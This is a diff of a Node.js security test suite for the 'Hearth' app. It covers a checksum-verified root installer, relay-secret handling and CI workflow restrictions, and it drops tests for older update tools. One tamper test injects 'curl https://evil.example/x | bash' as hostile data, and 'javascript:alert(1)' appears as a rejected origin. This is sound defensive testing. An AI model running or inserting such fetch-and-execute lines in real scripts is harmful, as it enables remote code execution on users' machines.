@@ -1,6 +1,6 @@
 // Infrastructure hardening: who may tell Hearth a visitor's address (TRUST_PROXY), the TURN relay sample, the
-// update tools (checksums, no fixed /tmp names, never auto-installing a random download, plain installs not
-// coming back as root) and the CI workflows (least privilege, pinned actions, locked installs).
+// server updater (checksums, no fixed /tmp names, plain installs not coming back as root) and the CI workflows
+// (least privilege, pinned actions, locked installs).
 const { test } = require('node:test');
 const assert = require('node:assert/strict');
 const { spawn, spawnSync, execFileSync } = require('node:child_process');
@@ -222,7 +222,7 @@ test('static TURN credentials still work but the server warns about them', async
 // ------------------------------------------------------------------ fixed /tmp names in root scripts (infra-11)
 test('nothing run as root writes to a fixed name in /tmp', async () => {
   const code = (p) => read(p).split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
-  for (const p of ['scripts/hearth-update.sh', 'scripts/harden-vps.sh', 'scripts/setup-turn.sh', 'tools/update-hearth.sh', 'tools/Update-Hearth.ps1', 'server/regions.js']) {
+  for (const p of ['scripts/hearth-update.sh', 'scripts/harden-vps.sh', 'scripts/setup-turn.sh', 'server/regions.js']) {
     assert.doesNotMatch(code(p), /\/tmp\/hearth-/, p);
   }
   // The region installer (run as root on a fresh VPS) writes its helper into a mktemp folder.
@@ -239,6 +239,121 @@ test('nothing run as root writes to a fixed name in /tmp', async () => {
   } finally { await srv.stop(); }
 });
 
+// ------------------------------------------------------------------ region installer and relay secret (code-4, code-5)
+test('a region install command only fetches over https, checks the download\'s SHA-256 and runs nothing that doesn\'t match', { skip: !['bash', 'sha256sum', 'mktemp'].every(has) && 'needs bash, sha256sum and mktemp' }, async () => {
+  const srv = await startServer();
+  const t = tmp();
+  try {
+    const add = (origin) => srv.api('POST', '/admin/regions', { token: srv.owner.token, ip: srv.owner.ip, body: { name: 'Test', origin, authKey: srv.owner.authKey } });
+    // The installer runs as root and carries the relay secret: never from a plain http address on the network.
+    for (const origin of ['http://chat.example.test', 'http://203.0.113.5:3000', 'ftp://chat.example.test', 'javascript:alert(1)']) {
+      const r = await add(origin);
+      assert.equal(r.status, 400, origin);
+    }
+    assert.match((await add('http://chat.example.test')).json.error, /https/);
+    const ok = await add('https://chat.example.test');
+    assert.equal(ok.status, 200, ok.text);
+    const { command } = ok.json;
+    const { id } = ok.json.region;
+    const token = /[?&]k=([0-9a-f]+)/.exec(command)[1];
+    assert.match(command, /^f="\$\(mktemp\)" && curl -fsSL --proto '=https' /);
+    assert.ok(command.includes(` -o "$f" 'https://chat.example.test/regions/install/${id}?k=${token}' && `), command);
+    assert.doesNotMatch(command, /\|\s*(sudo\s+)?(ba)?sh\b/, 'never piped straight into a shell');
+    const script = await (await fetch(`${srv.base}/regions/install/${id}?k=${token}`)).text();
+    const sum = crypto.createHash('sha256').update(script).digest('hex');
+    assert.ok(command.includes(`echo '${sum}  '"$f" | sha256sum -c - && sudo bash "$f"; rm -f "$f"`), 'the command carries the SHA-256 of exactly what is served');
+    // The relay secret reaches setup-turn.sh in a root-only file, not on its command line.
+    assert.match(script, /\( umask 077 && printf '%s\\n' '[^'\n]+' > "\$SETUP_DIR\/turn-secret" \)\n/);
+    assert.match(script, /bash "\$SETUP_DIR\/setup-turn\.sh" --relay-only --managed --secret-file "\$SETUP_DIR\/turn-secret"\n/);
+    assert.doesNotMatch(script, /--secret '/);
+    // Renaming the region afterwards doesn't change what's served (its name isn't in the script).
+    assert.equal((await srv.api('PATCH', `/admin/regions/${id}`, { token: srv.owner.token, ip: srv.owner.ip, body: { name: 'Renamed' } })).status, 200);
+    assert.equal(await (await fetch(`${srv.base}/regions/install/${id}?k=${token}`)).text(), script);
+
+    // Run the command itself, with a curl that "downloads" a given file and a sudo that keeps what it was asked to run.
+    const bin = path.join(t, 'bin');
+    fs.mkdirSync(bin);
+    const served = path.join(t, 'served');
+    const ran = path.join(t, 'ran');
+    stub(bin, 'curl', `o=""; while [ $# -gt 0 ]; do [ "$1" = -o ] && o="$2"; shift; done; cp "${served}" "$o"`);
+    stub(bin, 'sudo', `[ "$1" = bash ] && cp "$2" "${ran}"`);
+    const work = path.join(t, 'work');
+    fs.mkdirSync(work);
+    const run = () => {
+      fs.rmSync(ran, { force: true });
+      return spawnSync('bash', ['--noprofile', '--norc', '-c', command], { env: { ...process.env, PATH: `${bin}:${process.env.PATH}`, TMPDIR: work }, encoding: 'utf8' });
+    };
+    fs.writeFileSync(served, script);
+    let r = run();
+    assert.equal(fs.readFileSync(ran, 'utf8'), script, r.stdout + r.stderr);
+    // Changed on the way, or cut off part-way: it says so, and nothing runs.
+    for (const other of [script.replace('set -Eeuo pipefail', 'set -Eeuo pipefail\ncurl https://evil.example/x | bash'), script.slice(0, 300)]) {
+      fs.writeFileSync(served, other);
+      r = run();
+      assert.ok(!fs.existsSync(ran), 'a download that doesn\'t match never runs');
+      assert.match(r.stdout + r.stderr, /FAILED/);
+    }
+    assert.deepEqual(fs.readdirSync(work), [], 'the downloaded file is removed');
+  } finally { await srv.stop(); fs.rmSync(t, { recursive: true, force: true }); }
+});
+
+test('setup-turn.sh never puts the relay secret on a command line or on screen', { skip: !has('bash') && 'needs bash' }, () => {
+  const script = read('scripts/setup-turn.sh');
+  const code = script.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
+  // Into Hearth through standard input (the shell's own printf), never as an argument to cli.js.
+  assert.match(code, /printf '%s\\n' "\$SECRET" \| hearth_cli add-turn "\$URLS" --secret-stdin/);
+  assert.doesNotMatch(code, /hearth_cli [^\n|]*"\$SECRET"/);
+  // Never printed or echoed (other than into that pipe).
+  for (const l of code.split('\n')) {
+    if (/\b(printf|echo|ok|step|warn|die)\b[^;|&\n]*\$\{?SECRET\b/.test(l)) assert.match(l, /^\s*printf '%s\\n' "\$SECRET" \| hearth_cli /, l);
+  }
+  // The config file is private from the start and put in place whole.
+  assert.ok(code.indexOf('umask 077') < code.indexOf('mktemp /etc/turnserver.conf.XXXXXX'));
+  assert.ok(code.indexOf('chmod 640 "$CONF_NEW"') < code.indexOf('mv -f "$CONF_NEW" /etc/turnserver.conf'));
+  assert.doesNotMatch(code, /cat > \/etc\/turnserver\.conf/);
+  // --secret (on the command line) is refused before anything happens; so are a bad secret file and no secret at all.
+  // (Everything that would touch this machine is stubbed to fail, in case a check ever lets one through.)
+  const t = tmp();
+  try {
+    const bin = path.join(t, 'bin');
+    fs.mkdirSync(bin);
+    stub(bin, 'id', 'if [ "$*" = "-u" ]; then echo 0; else PATH=/usr/bin:/bin exec id "$@"; fi');
+    for (const c of ['apt-get', 'curl', 'systemctl', 'ufw', 'docker', 'node', 'runuser', 'openssl', 'mktemp']) stub(bin, c, 'echo "ran $0" >&2; exit 1');
+    const run = (args) => spawnSync('bash', [path.join(ROOT, 'scripts/setup-turn.sh'), ...args], { env: { ...process.env, PATH: `${bin}:${process.env.PATH}` }, encoding: 'utf8', input: '' });
+    let r = run(['--relay-only', '--secret', 'S3CRET-VALUE-123']);
+    assert.equal(r.status, 1);
+    assert.match(r.stderr, /--secret-file/);
+    assert.doesNotMatch(r.stdout + r.stderr, /S3CRET-VALUE-123|ran /);
+    assert.equal(run(['--relay-only', '--secret=S3CRET-VALUE-123']).status, 1);
+    const f = path.join(t, 'secret');
+    fs.writeFileSync(f, 'abc\u0001def\n', { mode: 0o600 });
+    r = run(['--relay-only', '--secret-file', f]);
+    assert.equal(r.status, 1);
+    assert.match(r.stderr, /control character/);
+    fs.writeFileSync(f, '');
+    assert.match(run(['--relay-only', '--secret-file', f]).stderr, /is empty/);
+    r = run(['--relay-only']); // not a terminal: nobody to ask
+    assert.equal(r.status, 1);
+    assert.match(r.stderr, /needs the main server's relay secret/);
+    assert.doesNotMatch(r.stdout + r.stderr, /ran /);
+  } finally { fs.rmSync(t, { recursive: true, force: true }); }
+});
+
+test('cli.js takes the relay secret from standard input', () => {
+  const dir = tmp();
+  try {
+    const cli = (args, input = '') => spawnSync(process.execPath, ['server/cli.js', ...args], { cwd: ROOT, env: { ...process.env, DATA_DIR: dir }, input, encoding: 'utf8' });
+    let r = cli(['add-turn', 'turn:203.0.113.7:3478?transport=udp', '--secret-stdin'], 'from-stdin-1\n');
+    assert.equal(r.status, 0, r.stdout + r.stderr);
+    assert.equal(cli(['get-turn-secret']).stdout.trim(), 'from-stdin-1');
+    r = cli(['set-turn', 'turn:203.0.113.8:3478?transport=udp', '--secret-stdin'], 'from-stdin-2\r\nignored\n');
+    assert.equal(r.status, 0, r.stdout + r.stderr);
+    assert.equal(cli(['get-turn-secret']).stdout.trim(), 'from-stdin-2', 'only the first line, without its line break');
+    assert.notEqual(cli(['set-turn', 'turn:203.0.113.8:3478?transport=udp', '--secret-stdin'], '\n').status, 0, 'an empty secret is refused');
+    assert.equal(cli(['get-turn-secret']).stdout.trim(), 'from-stdin-2');
+  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
+});
+
 // ------------------------------------------------------------------ hearth-update.sh (infra-4, infra-11, admin-11)
 const stub = (dir, name, body) => { fs.writeFileSync(path.join(dir, name), `#!/bin/bash\n${body}\n`, { mode: 0o755 }); };
 const shellReady = () => ['bash', 'zip', 'unzip', 'rsync', 'sha256sum', 'tar', 'flock'].every(has);
@@ -251,7 +366,7 @@ function updateLab({ owner = 'alice', progOwner = owner, proc = '', newLock = fa
   // The stubs make the script believe it's root, so first make sure it keeps everything in the scratch folder
   // (a version without these settings would write to /root, /etc and /usr/local/bin).
   const text = read('scripts/hearth-update.sh');
-  for (const v of ['HEARTH_BACKUP_ROOT', 'HEARTH_UPDATE_CONF', 'HEARTH_UPDATE_BIN', 'HEARTH_UPDATE_LOCK']) assert.ok(text.includes(`\${${v}:-`), `hearth-update.sh honours ${v}`);
+  for (const v of ['HEARTH_BACKUP_ROOT', 'HEARTH_UPDATE_CONF', 'HEARTH_UPDATE_BIN', 'HEARTH_UPDATE_LOCK', 'HEARTH_UPDATE_PUBKEY']) assert.ok(text.includes(`\${${v}:-`), `hearth-update.sh honours ${v}`);
   const t = tmp();
   const app = path.join(t, 'app');
   for (const d of ['server', 'data', 'node_modules']) fs.mkdirSync(path.join(app, d), { recursive: true });
@@ -319,6 +434,7 @@ esac`);
   const env = {
     ...process.env, PATH: `${bin}:${process.env.PATH}`, HEARTH_DIR: app, HEARTH_BACKUP_ROOT: path.join(t, 'backups'),
     HEARTH_UPDATE_CONF: path.join(t, 'conf'), HEARTH_UPDATE_BIN: path.join(t, 'hearth-update'), HEARTH_UPDATE_LOCK: path.join(t, 'lock'),
+    HEARTH_UPDATE_PUBKEY: path.join(t, 'hearth-update.pub'),
   };
   const run = (...args) => spawnSync('bash', [path.join(ROOT, 'scripts/hearth-update.sh'), ...args], { env, encoding: 'utf8', timeout: 60000, input: '' });
   const calls_ = () => (fs.existsSync(calls) ? fs.readFileSync(calls, 'utf8') : '');
@@ -523,176 +639,6 @@ test('plain installs behind a proxy are told about the new TRUST_PROXY rule once
   }
 });
 
-// ------------------------------------------------------------------ tools/update-hearth.sh (admin-11, infra-11)
-// The tool talks to stubs: ssh/scp only write what they were asked to do to a log (ssh exits with STUB_CODE for
-// the install and prints a log line for the log fetch), so nothing leaves this machine.
-function toolLab() {
-  const t = tmp();
-  const home = path.join(t, 'home');
-  fs.mkdirSync(path.join(home, 'Downloads'), { recursive: true });
-  fs.writeFileSync(path.join(home, '.hearth-update'), 'HOST=203.0.113.5\nUSR=admin\nPORT=22\n');
-  const src = path.join(t, 'src', 'hearth', 'server');
-  fs.mkdirSync(src, { recursive: true });
-  fs.writeFileSync(path.join(src, 'index.js'), '//\n');
-  const zip = path.join(home, 'Downloads', 'hearth-update.zip');
-  execFileSync('zip', ['-qr', zip, 'hearth'], { cwd: path.join(t, 'src') });
-  const bin = path.join(t, 'bin');
-  fs.mkdirSync(bin);
-  const calls = path.join(t, 'calls.log');
-  stub(bin, 'ssh', `last="\${!#}"; case "$last" in true) exit 0 ;; esac; printf 'ssh %s\\n' "$last" >> "${calls}"
-case "$last" in *last-update.log*) echo 'server log: the updater said why'; exit 0 ;; esac
-exit "\${STUB_CODE:-0}"`);
-  stub(bin, 'scp', `echo "scp $*" >> "${calls}"`);
-  // A copy of the tool: on a failure it saves the server's log next to itself.
-  const tool = path.join(t, 'tools', 'update-hearth.sh');
-  fs.mkdirSync(path.dirname(tool));
-  fs.copyFileSync(path.join(ROOT, 'tools/update-hearth.sh'), tool);
-  const run = (args, input = '', code = 0) => spawnSync('bash', [tool, ...args], { env: { ...process.env, HOME: home, PATH: `${bin}:${process.env.PATH}`, STUB_CODE: String(code) }, encoding: 'utf8', input, timeout: 30000 });
-  const calls_ = () => (fs.existsSync(calls) ? fs.readFileSync(calls, 'utf8') : '');
-  return { t, zip, run, calls: calls_, reset: () => fs.rmSync(calls, { force: true }), done: () => fs.rmSync(t, { recursive: true, force: true }) };
-}
-const toolSkip = !['bash', 'zip', 'unzip', 'sha256sum'].every(has) && 'needs bash, zip, unzip';
-// What the tool sent: the scp upload name and the install command.
-const sent = (calls) => ({
-  up: (/^scp .* admin@203\.0\.113\.5:(\S+)$/m.exec(calls) || [])[1],
-  remote: (calls.split('\n').find((l) => l.startsWith('ssh ') && !l.includes('last-update.log')) || '').slice(4),
-  logins: calls.split('\n').filter((l) => /^(ssh|scp) /.test(l)).length,
-});
-
-test('the Mac/Linux update tool never installs a zip from Downloads that nobody picked', { skip: toolSkip }, () => {
-  const lab = toolLab();
-  try {
-    const r = lab.run([], 'y\n'); // not a terminal: there's nobody to confirm with
-    assert.notEqual(r.status, 0);
-    assert.match(r.stdout, /won't install a file nobody picked/);
-    assert.equal(lab.calls(), '', 'nothing was uploaded or run');
-  } finally { lab.done(); }
-});
-
-test('the Mac/Linux update tool checks the checksum, uploads privately and logs in only twice', { skip: toolSkip }, () => {
-  const lab = toolLab();
-  try {
-    fs.writeFileSync(lab.zip + '.sha256', `${'f'.repeat(64)}  hearth-update.zip\n`);
-    const bad = lab.run([lab.zip]);
-    assert.notEqual(bad.status, 0);
-    assert.match(bad.stdout, /doesn't match/);
-    assert.equal(lab.calls(), '', 'a zip that fails its checksum is never uploaded');
-
-    const sum = crypto.createHash('sha256').update(fs.readFileSync(lab.zip)).digest('hex');
-    fs.writeFileSync(lab.zip + '.sha256', `${sum}  hearth-update.zip\n`);
-    const ok = lab.run([lab.zip]);
-    assert.equal(ok.status, 0, ok.stdout + ok.stderr);
-    const { up, remote, logins } = sent(lab.calls());
-    // Into the account's own home folder (no other account can write there), under a name nobody can guess.
-    assert.match(up, /^\.hearth-upload-[0-9a-f]{16}\.zip$/);
-    // One upload, one install: someone typing a password types it twice, not three times.
-    assert.equal(logins, 2, lab.calls());
-    // On the server: moved into a private folder and checked before anything is unpacked or run.
-    const at = (s) => { const i = remote.indexOf(s); assert.ok(i >= 0, `${s} in ${remote}`); return i; };
-    assert.ok(at('D=$(mktemp -d)') < at(`mv ~/${up} $D/update.zip`));
-    assert.ok(at(`mv ~/${up} $D/update.zip`) < at(`echo '${sum}  update.zip' > update.zip.sha256; sha256sum -c`));
-    assert.ok(at('sha256sum -c') < at('unzip -p update.zip'));
-    assert.match(remote, /trap 'rm -rf \$D' EXIT/);
-    assert.match(remote, /sudo bash hearth-update\.sh \$D\/update\.zip; /);
-    assert.doesNotMatch(lab.calls(), /\/tmp\/hearth-update/);
-  } finally { lab.done(); }
-});
-
-test('update tools: "nothing was installed" only when the updater never ran; otherwise the server log is fetched', { skip: toolSkip }, () => {
-  const lab = toolLab();
-  try {
-    // 90 is the upload check on the server: the right message, and no stale log from an earlier update.
-    let r = lab.run([lab.zip], '', 90);
-    assert.equal(r.status, 90);
-    assert.match(r.stdout, /The upload doesn't match the file on this computer/);
-    assert.doesNotMatch(lab.calls(), /last-update\.log/);
-    // 12 is what the updater itself returns when rsync fails halfway (Hearth may be stopped): never "nothing
-    // was installed", and the operator gets the server's log.
-    lab.reset();
-    r = lab.run([lab.zip], '', 12);
-    assert.equal(r.status, 12);
-    assert.doesNotMatch(r.stdout, /doesn't match|Nothing was installed/);
-    assert.match(r.stdout, /did not finish \(exit code 12\)/);
-    assert.match(r.stdout, /server log: the updater said why/);
-    assert.match(lab.calls(), /last-update\.log/);
-    // The same for 11 (rsync's "file I/O error"), which used to mean "no updater in the zip".
-    lab.reset();
-    r = lab.run([lab.zip], '', 11);
-    assert.equal(r.status, 11);
-    assert.match(lab.calls(), /last-update\.log/);
-  } finally { lab.done(); }
-});
-
-test('update tools: the install command really checks the upload and keeps 90-92 for its own checks', { skip: toolSkip }, () => {
-  // Run the exact command the tool sends, here, as the "server": a scratch home folder with the upload in it,
-  // and a sudo that just runs the command.
-  const lab = toolLab();
-  try {
-    const server = path.join(lab.t, 'server');
-    const sbin = path.join(server, 'bin');
-    fs.mkdirSync(sbin, { recursive: true });
-    stub(sbin, 'sudo', 'exec "$@"');
-    // Updates whose hearth-update.sh exits with UPDATER_CODE and notes what it was given.
-    const zipWith = (name, script) => {
-      const dir = path.join(lab.t, name, 'hearth');
-      fs.mkdirSync(path.join(dir, 'server'), { recursive: true });
-      fs.mkdirSync(path.join(dir, 'scripts'));
-      fs.writeFileSync(path.join(dir, 'server/index.js'), '//\n');
-      if (script) fs.writeFileSync(path.join(dir, 'scripts/hearth-update.sh'), script);
-      const z = path.join(lab.t, `${name}.zip`);
-      execFileSync('zip', ['-qr', z, 'hearth'], { cwd: path.dirname(dir) });
-      return z;
-    };
-    const good = zipWith('good', 'echo "$1" > "$HOME/ran"; exit "${UPDATER_CODE:-0}"\n');
-    const noUpdater = zipWith('none', null);
-    const onServer = (zip, { upload = zip, code = 0 } = {}) => {
-      lab.reset();
-      assert.equal(lab.run([zip]).status, 0);
-      const { up, remote } = sent(lab.calls());
-      fs.rmSync(path.join(server, 'tmp'), { recursive: true, force: true });
-      fs.mkdirSync(path.join(server, 'tmp'));
-      fs.copyFileSync(upload, path.join(server, up));
-      const r = spawnSync('sh', ['-c', remote], { env: { ...process.env, HOME: server, TMPDIR: path.join(server, 'tmp'), PATH: `${sbin}:${process.env.PATH}`, UPDATER_CODE: String(code) }, encoding: 'utf8' });
-      return { status: r.status, out: r.stdout + r.stderr, left: fs.readdirSync(path.join(server, 'tmp')), upLeft: fs.existsSync(path.join(server, up)) };
-    };
-    let r = onServer(good);
-    assert.equal(r.status, 0, r.out);
-    assert.match(fs.readFileSync(path.join(server, 'ran'), 'utf8').trim(), /\/tmp\/tmp\.[^/]+\/update\.zip$/, 'ran with the private copy');
-    assert.deepEqual(r.left, [], 'the private folder is removed afterwards');
-    assert.equal(r.upLeft, false, 'the upload was moved out of the home folder');
-    // A different file under the upload's name (damaged, or swapped): 90, and the updater never runs.
-    fs.rmSync(path.join(server, 'ran'));
-    r = onServer(good, { upload: noUpdater });
-    assert.equal(r.status, 90, r.out);
-    assert.ok(!fs.existsSync(path.join(server, 'ran')));
-    // No updater inside: 91.
-    assert.equal(onServer(noUpdater).status, 91);
-    // The updater's own failures come through as they are, except 90-92, which can't be mistaken for the above.
-    assert.equal(onServer(good, { code: 12 }).status, 12);
-    assert.equal(onServer(good, { code: 90 }).status, 1);
-    assert.equal(onServer(good, { code: 92 }).status, 1);
-  } finally { lab.done(); }
-});
-
-test('the Windows update tool sends exactly the same install command as the Mac/Linux one', { skip: toolSkip }, () => {
-  const lab = toolLab();
-  try {
-    assert.equal(lab.run([lab.zip]).status, 0);
-    const { up, remote } = sent(lab.calls());
-    const sum = crypto.createHash('sha256').update(fs.readFileSync(lab.zip)).digest('hex');
-    // PowerShell: $remote = "..." + "..." (`$ is a literal $; ${sudo}, $up and $sum are its own variables).
-    const ps = read('tools/Update-Hearth.ps1');
-    const block = ps.slice(ps.indexOf('$remote = '), ps.indexOf('\n& ssh @sshOpts -t -p $cfg.port $target $remote'));
-    const parts = [...block.matchAll(/"((?:[^"`]|`.)*)"/g)].map((m) => m[1]);
-    const psRemote = parts.join('').replace(/\$\{sudo\}/g, 'sudo ').replace(/\$up\b/g, up).replace(/\$sum\b/g, sum).replace(/`\$/g, '$');
-    assert.equal(psRemote, remote);
-    assert.doesNotMatch(ps, /'mktemp -d'/, 'no separate login just to make the folder');
-    // And it handles the codes the same way: 90-92 explained without a stale log, everything else fetches it.
-    for (const c of ['90', '91', '92']) assert.match(ps, new RegExp(`^\\s+${c} \\{ Fail `, 'm'));
-    assert.match(ps, /\$logText = & ssh/);
-  } finally { lab.done(); }
-});
-
 test('scripts/make-update-zip.sh makes the zip the updaters expect, with a matching .sha256', { skip: !(['bash', 'zip', 'unzip', 'git'].every(has) && spawnSync('git', ['rev-parse', '--git-dir'], { cwd: ROOT }).status === 0) && 'needs a git checkout' }, () => {
   const out = tmp();
   try {
@@ -704,7 +650,7 @@ test('scripts/make-update-zip.sh makes the zip the updaters expect, with a match
     assert.equal(name, path.basename(zip));
     assert.equal(sum, crypto.createHash('sha256').update(fs.readFileSync(zip)).digest('hex'));
     const list = execFileSync('unzip', ['-Z1', zip], { encoding: 'utf8' }).split('\n');
-    for (const f of ['hearth/server/index.js', 'hearth/scripts/hearth-update.sh', 'hearth/tools/update-hearth.sh']) assert.ok(list.includes(f), f);
+    for (const f of ['hearth/server/index.js', 'hearth/scripts/hearth-update.sh']) assert.ok(list.includes(f), f);
     assert.ok(!list.some((f) => /^hearth\/(data|node_modules)\/|\/\.env$/.test(f)), 'no data, libraries or secrets');
     // A relative folder is where you are, not inside the source tree.
     const rel = spawnSync('bash', [path.join(ROOT, 'scripts/make-update-zip.sh'), 'rel-out'], { cwd: out, encoding: 'utf8', timeout: 60000 });
@@ -803,8 +749,68 @@ test('workflows: installers only reach everyone\'s apps from tags and the defaul
   }
 });
 
+// The production environment's rules allow only the default branch and release tags: a job that enters it from
+// anywhere else (a manual run on a feature branch) would fail there instead of being skipped.
+test('workflows: jobs in the production environment only run for tags and the default branch', { skip: !workflowFiles().length && 'no workflows in this checkout' }, () => {
+  let seen = 0;
+  for (const f of workflowFiles()) {
+    for (const [name, body] of Object.entries(jobsOf(fs.readFileSync(f, 'utf8')).jobs)) {
+      if (!/^ {4}environment: production$/m.test(body)) continue;
+      seen++;
+      const cond = /^\s{4}if:\s*>?-?\s*\n?([\s\S]*?)\n\s{4}runs-on:/m.exec(body);
+      assert.ok(cond, `${f}: ${name} has a condition`);
+      assert.doesNotMatch(cond[1], /workflow_dispatch|event_name/, `${f}: ${name} must not run for a manual run from any branch`);
+      assert.match(cond[1], /refs\/tags\/|default_branch/, `${f}: ${name}`);
+    }
+  }
+  assert.ok(seen > 0, 'some job runs in the production environment');
+});
+
 // The steps of a job, as text: each starts at "      - ".
 const stepsOf = (job) => job.split(/\n(?= {6}- )/).filter((s) => /^ {6}- /.test(s));
+
+test('workflows: release secrets only in "production" jobs that install no npm packages; only final, signed files are published; no signing key is made or cached', { skip: !fs.existsSync(path.join(ROOT, '..', '.github', 'workflows', 'hearth-apps.yml')) && 'no apps workflow in this checkout' }, () => {
+  const text = fs.readFileSync(path.join(ROOT, '..', '.github', 'workflows', 'hearth-apps.yml'), 'utf8');
+  const { jobs } = jobsOf(text);
+  // The Android key comes from secrets only: none is generated, kept in the Actions cache, or protected by a
+  // password written here.
+  assert.doesNotMatch(text, /actions\/cache@|keytool -genkeypair|hearth-build/);
+  assert.doesNotMatch(text, /HEARTH_(KEYSTORE|KEY)_PASSWORD:[^\n]*\|\| '/, 'no fallback password');
+  // Signing and publishing secrets only in jobs of the "production" environment (protection rules apply there),
+  // and never in a job that runs code from npm packages or the build tools.
+  for (const [name, body] of Object.entries(jobs)) {
+    if (!/secrets\.(UPDATE_SIGNING_KEY|VPS_SSH_KEY|PLAY_SERVICE_ACCOUNT_JSON)\b/.test(body)) continue;
+    assert.match(body, /^ {4}environment: production$/m, `${name} runs in the production environment`);
+    assert.doesNotMatch(body, /\bnpm (ci|install|i)\b|\bnpx\b|electron-builder|gradlew/, `${name} installs no npm packages and runs no build`);
+  }
+  for (const name of ['sign-updates', 'release', 'publish-to-vps', 'play-upload']) assert.match(jobs[name] || '', /^ {4}environment: production$/m, name);
+  assert.doesNotMatch(jobs.desktop, /secrets\.UPDATE_SIGNING_KEY/, 'the build only gets the public key');
+  assert.match(jobs.desktop, /UPDATE_PUBLIC_KEY: \$\{\{ vars\.UPDATE_PUBLIC_KEY \}\}/);
+  // An unsigned APK is named and uploaded as such, apart from the signed one.
+  assert.match(jobs.android, /if: steps\.secretkey\.outputs\.found == '1'\n\s+with:\n\s+name: hearth-android\n/);
+  assert.match(jobs.android, /name: hearth-android-UNSIGNED\n\s+path: hearth\/mobile\/unsigned\/\*-UNSIGNED\.apk/);
+  assert.match(jobs.android, /"\.\.\/unsigned\/Hearth-\$VERSION_NAME-UNSIGNED\.apk"/);
+  // The release and the server copy download only the final artifacts by name, never "everything in the run", and
+  // refuse anything unsigned or intermediate before publishing.
+  const glob = (p) => new RegExp(`^${p.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*')}$`);
+  for (const name of ['release', 'publish-to-vps']) {
+    const steps = stepsOf(jobs[name]);
+    const downloads = steps.filter((s) => /uses: actions\/download-artifact@/.test(s));
+    assert.ok(downloads.length >= 2, name);
+    for (const s of downloads) {
+      const want = /^\s+(?:pattern|name): (\S+)$/m.exec(s);
+      assert.ok(want, `${name}: every download names what it takes`);
+      for (const other of ['hearth-windows-unsigned-app', 'hearth-windows-unsigned-setup', 'hearth-android-UNSIGNED', 'hearth-android-play-bundle']) {
+        assert.doesNotMatch(other, glob(want[1]), `${name} never downloads ${other}`);
+      }
+    }
+    const refuse = steps.findIndex((s) => s.includes('name: Refuse unsigned and intermediate files'));
+    const publish = steps.findIndex((s) => /softprops\/action-gh-release|name: Copy installers to the server/.test(s));
+    assert.ok(refuse >= 0 && refuse < publish, `${name} refuses unsigned files before publishing`);
+    assert.match(steps[refuse], /bad=\(dist\/\*unsigned\* dist\/\*\.aab\)/);
+    assert.match(steps[refuse], /nocaseglob/);
+  }
+});
 const stepNamed = (f, name) => stepsOf(jobsOf(fs.readFileSync(f, 'utf8')).jobs['publish-to-vps'] || '').find((s) => s.includes(`name: ${name}`));
 
 test('workflows: the server\'s SSH key only goes to the runner\'s own ssh, which only talks to the pinned host', { skip: !workflowFiles().length && 'no workflows in this checkout' }, () => {
